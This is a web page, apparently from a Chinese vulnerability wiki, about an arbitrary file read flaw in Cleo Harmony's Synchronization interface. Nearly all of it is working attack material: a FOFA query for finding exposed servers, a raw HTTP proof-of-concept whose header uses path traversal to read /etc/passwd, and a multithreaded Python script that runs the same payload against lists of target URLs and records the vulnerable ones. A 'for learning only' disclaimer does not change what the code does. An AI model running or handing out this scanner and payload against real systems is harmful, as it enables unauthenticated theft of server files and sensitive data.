<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Cleo%20Harmony/Cleo%20Harmony%E6%8E%A5%E5%8F%A3Synchronization%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Cleo Harmony接口Synchronization存在任意文件读取漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Cleo Harmony\u63a5\u53e3Synchronization\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e", url: "#_top", children: [
          ]},
          {title: "fofa", url: "#fofa", children: [
          ]},
          {title: "POC", url: "#poc", children: [
          ]},
          {title: "python\u5229\u7528\u811a\u672c", url: "#python", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../CloudPanel/CloudPanel%20RCE%E6%BC%8F%E6%B4%9E%20CVE-2023-35885/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../CloudPanel/CloudPanel%20RCE%E6%BC%8F%E6%B4%9E%20CVE-2023-35885/" class="btn btn-xs btn-link">
        CloudPanel RCE漏洞 CVE 2023 35885
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Citrix%20XenMobile/Citrix%20XenMobile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CVE-2020-8209/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Citrix%20XenMobile/Citrix%20XenMobile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CVE-2020-8209/" class="btn btn-xs btn-link">
        Citrix XenMobile 任意文件读取 CVE-2020-8209
      </a>
    </div>
    
  </div>

    

    <h2 id="cleo-harmonysynchronization">Cleo Harmony接口Synchronization存在任意文件读取漏洞<a class="headerlink" href="#cleo-harmonysynchronization" title="Permanent link">&para;</a></h2>
<p>Cleo Harmony的Synchronization接口存在任意文件读取漏洞，未经身份验证的攻击者可以通过漏洞读取服务器任意文件，从而获取大量敏感信息。</p>
<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>body=&quot;packages/partnerlogos/userportal_logo&quot;
</code></pre></div>
<h2 id="poc">POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">GET /Synchronization HTTP/1.1</span>
<span class="l l-Scalar l-Scalar-Plain">Host</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">127.0.0.1</span>
<span class="nt">User-Agent</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0</span>
<span class="nt">Accept</span><span class="p">:</span><span class="w"> </span><span class="err">*</span><span class="l l-Scalar l-Scalar-Plain">/*</span>
<span class="nt">Accept-Language</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class="nt">Accept-Encoding</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">gzip, deflate, br</span>
<span class="nt">Connection</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">keep-alive</span>
<span class="nt">Cookie</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">csrftoken=z1GtnjQWsIKwGazlFX7V; csrftoken=NX6iujIUcamW9umprA1vx19dzU6EZNLa; csrftoken=kZ4jVQ4uZtITYtnweSsVDUEwZ2ltraTF</span>
<span class="nt">Priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">u=4</span>
<span class="nt">Retrieve</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">l=Ab1234-RQ0258;n=VLTrader;v=7.2.1;a=1337;po=1337;s=True;b=False;pp=1337;path=../../etc/passwd</span>
</code></pre></div>
<h2 id="python">python利用脚本<a class="headerlink" href="#python" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code># _*_ coding : utf-8 _*_
# @Time : 2025-03-14 9:20
# Author : 长安风生
# File : Cleo_read
# Project : pythonProject
import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning

# 禁止显示与不安全请求相关的警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

#检测前描述
def print_logo():
    logo = &quot;&quot;&quot;
             .__                                           _____                           .__                           
  ____ |  |__ _____    ____    _________    ____   _/ ____\____   ____    ____  _____|  |__   ____   ____    ____  
_/ ___\|  |  \\__  \  /    \  / ___\__  \  /    \  \   __\/ __ \ /    \  / ___\/  ___/  |  \_/ __ \ /    \  / ___\ 
\  \___|   Y  \/ __ \|   |  \/ /_/  &gt; __ \|   |  \  |  | \  ___/|   |  \/ /_/  &gt;___ \|   Y  \  ___/|   |  \/ /_/  &gt;
 \___  &gt;___|  (____  /___|  /\___  (____  /___|  /  |__|  \___  &gt;___|  /\___  /____  &gt;___|  /\___  &gt;___|  /\___  / 
     \/     \/     \/     \//_____/     \/     \/             \/     \//_____/     \/     \/     \/     \//_____/
    &quot;&quot;&quot;
    print(logo)

def print_usage():
    print(&quot;使用帮助：&quot;)
    print(&quot;    1.创建Cleo_read_check.txt把要检测的url放入Cleo_read_check.txt&quot;)
    print(&quot;    2.把Cleo_read_check.txt和Cleo_read.py放在同一文件夹下&quot;)
    print(&quot;    3.python Cleo_read.py&quot;)
    print()
    print(&quot;结果说明：&quot;)
    print(&quot;    成功检测出的url会保存到Cleo_read.txt&quot;)
    print()

def start_message():
    print(&quot;本程序仅供学习使用，如若非法他用，与本文作者无关，需自行负责！&quot;)
    print(&quot;程序功能：多线测检测Cleo文件传输软件任意文件读取漏洞(CVE-2024-50623）   By:长安风生&amp;棉花糖网络安全&quot;)
    print(&quot;-&quot; * 88)  # 打印分割线

def print_red(text):
    # ANSI转义序列设置为红色，让存在的漏洞的变成红色醒目
    red_start = &quot;\033[91m&quot;
    red_end = &quot;\033[0m&quot;
    print(red_start + text + red_end)

def check_vulnerability(target_url):
    headers = {
        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#39;,
        &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39;,
        &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.9&#39;,
        &#39;Vlsync&#39;: (&#39;Retrieve;l=Ab1234-RQ0258;n=VLTrader;v=7.2.1;a=1337;po=1337;&#39;
                   &#39;s=True;b=False;pp=1337;path=../../etc/passwd&#39;),
        &#39;Accept-Encoding&#39;: &#39;gzip, deflate, br&#39;
    }

    try:
        response = requests.get(target_url, headers=headers, timeout=10, verify=False)
        if &quot;root:x:&quot; in response.text:
            # print(response.text)
            print_red(f&quot;[+] The target {target_url} is potentially vulnerable to arbitrary file read.&quot;)
            return target_url
        else:
            print(f&quot;[-] The target {target_url} does not appear to be vulnerable to arbitrary file read.&quot;)
    except requests.RequestException as e:
        print(f&quot;[!] Failed to connect to {target_url}: {e}&quot;)
    return None

def process_url(line):
    base_url = line.strip()
    target_url = base_url + &#39;/Synchronization&#39;
    return check_vulnerability(target_url)

if __name__ == &quot;__main__&quot;:
    print_logo()
    print_usage()
    start_message()
    # 询问是否想要执行检测
    execute_check = input(&quot;您希望现在执行漏洞检测吗？(yes/no): &quot;).strip().lower()
    if execute_check not in [&quot;yes&quot;, &quot;y&quot;]:
        print(&quot;执行已取消!&quot;)
        sys.exit(0)

    vulnerable_urls = []  # 用于存储检查成功的URL

    with open(&#39;Cleo_read_check.txt&#39;, &#39;r&#39;) as file:
        urls = [line.strip() for line in file]

    with ThreadPoolExecutor(max_workers=10) as executor:
        # 使用future对象来获取线程执行的结果
        future_to_url = {executor.submit(process_url, url): url for url in urls}
        for future in as_completed(future_to_url):
            result = future.result()
            if result:
                vulnerable_urls.append(result)

    # 执行结束后，将所有检测成功的URL写入Cleo_read.txt
    with open(&#39;Cleo_read.txt&#39;, &#39;w&#39;) as file:
        for url in vulnerable_urls:
            file.write(url + &#39;\n&#39;)
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../CloudPanel/CloudPanel%20RCE%E6%BC%8F%E6%B4%9E%20CVE-2023-35885/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../CloudPanel/CloudPanel%20RCE%E6%BC%8F%E6%B4%9E%20CVE-2023-35885/" class="btn btn-xs btn-link">
        CloudPanel RCE漏洞 CVE 2023 35885
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Citrix%20XenMobile/Citrix%20XenMobile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CVE-2020-8209/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Citrix%20XenMobile/Citrix%20XenMobile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CVE-2020-8209/" class="btn btn-xs btn-link">
        Citrix XenMobile 任意文件读取 CVE-2020-8209
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>